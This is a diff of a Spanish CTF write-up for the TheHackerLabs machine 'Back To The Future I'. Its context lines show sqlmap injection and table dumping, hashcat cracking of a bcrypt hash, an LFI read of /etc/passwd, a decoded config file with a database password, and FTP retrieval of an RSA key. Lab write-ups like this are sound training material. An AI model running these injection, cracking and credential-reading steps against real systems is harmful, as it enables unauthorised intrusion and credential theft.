@@ -2,7 +2,18 @@
 layout: post
 title: Back To The Future I - TheHackerLabs - Linux
 date: 2026-11-18
-tags: nmap, whatweb, gobuster, sqlmap, hashcat, curl, ftp, zip2john, john, ssh2john, ssh-keygen, getcap 
+tags:  
+- `nmap`
+- `whatweb`
+- `gobuster`
+- `sqlmap`
+- `hashcat`
+- `curl`
+- `ftp`
+- `zip2john` / `john`
+- `ssh2john`
+- `ssh-keygen`
+- `getcap`
 
 ---
 
@@ -24,29 +35,29 @@ Comenzamos con la fase de reconocimiento con nuestra herramienta **Auto_Recon**,
 
 ## Enumeración
 
-![/secnotes/assets](Pasted%20image%2020261118200134.png)
-![](Pasted%20image%2020261118200209.png)
+![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118200134.png)
+![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118200209.png)
 
 Como vimos en otro laboratorio, `whatweb` nos muestra un error al intentar abrir un dominio.
-![](Pasted%20image%2020261118200318.png)
+![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118200318.png)
 
 Agregamos este dominio a nuestro archivo `/etc/hosts`
 
-![](Pasted%20image%2020261118200416.png)
+![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118200416.png)
 
 ahora podemos realizar el escaneo de directorios 
 
-![](Pasted%20image%2020261118201406.png)
+![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118201406.png)
 
 
 Al investigar en la página nos encontramos con una pista.
-![](Pasted%20image%2020261118201531.png)
+![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118201531.png)
 
 `<!-- ¡El reloj de la torre no tiene nada que ver! ¿O sí? -->`
 
 Además un panel de login.
 
-![](Pasted%20image%2020261118201633.png)
+![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118201633.png)
 
 No tenemos éxito 
 
@@ -56,7 +67,7 @@ Ya que no tenemos mayor información, vamos a centrarnos en SQL. Utilizaremos la
 sqlmap -u "http://hillvalley.thl/index.php" --data="username=admin&password=admin" -p username --batch --dbs
 ```
 
-![](Pasted%20image%2020261118203826.png)
+![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118203826.png)
 
 ### Que hace este comando? 
 
@@ -79,7 +90,7 @@ sqlmap -u "http://hillvalley.thl/index.php" --data="username=admin&password=admi
 con `-D` apuntamos a la base de datos que encontramos en el paso anterior.
 `--tables` le pedimos a `sqlmap` que liste todas las tablas dentro de la base.
 
-![](Pasted%20image%2020261118204139.png)
+![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118204139.png)
 
 El resultado fue la tabla `users`. Y ya que tenemos la base de datos, y el nombre de la tabla, lanzamos el comando:
 
@@ -89,15 +100,15 @@ sqlmap -u "http://hillvalley.thl/index.php" --data="username=admin&password=admi
 
 agregamos `-T users` para indicarle el nombre de la tabla que encontramos en el paso anterior y `--dump` para extraer todas las filas y columnas de esa tabla.
 
-![](Pasted%20image%2020261118204504.png)
+![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118204504.png)
 
 Ya tenemos información.
-![](Pasted%20image%2020261118205029.png)
+![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118205029.png)
 
 Tenemos al usuario `marty` y su contraseña hasheada.
 `sqlmap` nos avisa que el crackeo con diccionario en `Python` es muy leto para bcrypt, así que mejor usaremos una herramienta dedicada.
 
-![](Pasted%20image%2020261118205507.png)
+![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118205507.png)
 
 Así que nuestro siguiente paso será guardar el hash y utilizar `hashcat`
 
@@ -113,24 +124,24 @@ hashcat -m 3200 marty.txt /usr/share/wordlists/rockyou.txt
 
 
 y el resultado:
-![](Pasted%20image%2020261118210054.png)
+![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118210054.png)
 
 Al ingresar estas credenciales en el login del servicio web tenemos acceso al panel de administración.
 
-![](Pasted%20image%2020261118210220.png)
+![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118210220.png)
 
 Tenemos información en el panel
 
-![](Pasted%20image%2020261118210521.png)
-![](Pasted%20image%2020261118210533.png)
-![](Pasted%20image%2020261118210543.png)
-![](Pasted%20image%2020261118210552.png)
+![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118210521.png)
+![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118210533.png)
+![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118210543.png)
+![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118210552.png)
 
-![](Pasted%20image%2020261118210611.png)![](Pasted%20image%2020261118210434.png)
+![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118210611.png)![](Pasted%20image%2020261118210434.png)
 
 Probamos LFI para ver los usuarios activos en el servidor, tenemos exito 
 
-![](Pasted%20image%2020261118211152.png)
+![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118211152.png)
 
 ```bash
 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin _apt:x:42:65534::/nonexistent:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin tss:x:100:107:TPM software stack,,,:/var/lib/tpm:/bin/false systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin messagebus:x:101:108::/nonexistent:/usr/sbin/nologin avahi-autoipd:x:102:111:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin usbmux:x:103:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin dnsmasq:x:999:65534:dnsmasq:/var/lib/misc:/usr/sbin/nologin avahi:x:104:113:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin fwupd-refresh:x:106:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin saned:x:107:118::/var/lib/saned:/usr/sbin/nologin geoclue:x:108:119::/var/lib/geoclue:/usr/sbin/nologin polkitd:x:996:996:polkit:/nonexistent:/usr/sbin/nologin rtkit:x:109:120:RealtimeKit,,,:/proc:/usr/sbin/nologin colord:x:110:121:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin docbrown:x:1000:1000:docbrown,,,:/home/docbrown:/bin/bash sshd:x:113:65534::/run/sshd:/usr/sbin/nologin mysql:x:114:123:MySQL Server,,,:/nonexistent:/bin/false marty:x:1001:1001::/home/marty:/bin/bash ftp:x:115:124:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin 
@@ -163,7 +174,7 @@ decodificamos
 ```bash
 echo "PD9waHANCiRob3N0ID0gImxvY2FsaG9zdCI7DQokdXNlciA9ICJtYXJ0eSI7DQokcGFzcyA9ICJ0MW0zdHJhdmVsIjsNCiRkYiA9ICJoaWxsdmFsbGV5IjsNCg0KJGNvbm4gPSBteXNxbGlfY29ubmVjdCgkaG9zdCwgJHVzZXIsICRwYXNzLCAkZGIpOw0KaWYgKCEkY29ubikgew0KICAgIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiBteXNxbGlfY29ubmVjdF9lcnJvcigpKTsNCn0NCj8+DQo=" | base64 -d
 ```
-![](Pasted%20image%2020261118212032.png)
+![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118212032.png)
 
 y el resultado nos muestra otra contraseña para el usuario `marty`
 
@@ -181,9 +192,9 @@ Esto quiere decir que SSH solo acepta clave pública, no contraseña. Esto nos c
 
 y entramos de manera correcta. Aquí nos encontramos tres archivos, `backup.zip`, `note_to:marty.txt` y `delorean.png`. La vamos a copiar a nuestro equipo con el comando `get` (este nos permite pasarnos los archivos desde `ftp` a nuestra máquina atacante).
 
-![](Pasted%20image%2020261118220855.png)
+![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118220855.png)
 
-![](Pasted%20image%2020261118221221.png)
+![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118221221.png)
 
 ```bash
 ┌──(yorve㉿SecNotes)-[~/Desktop/backtothefuture]
@@ -199,7 +210,7 @@ Tuve que proteger el backup del sitio web. La contraseña es una combinación de
 
 la contraseña es `delorean1955`, datos sacados de la página..
 
-![](Pasted%20image%2020261118221536.png)
+![](/secnotes/assets/img/backtothefuture/Pasted%20image%2020261118221536.png)
 
 tenemos algo muy valioso.. una clave rsa, vamos a confirmar si tiene `passphase`
 
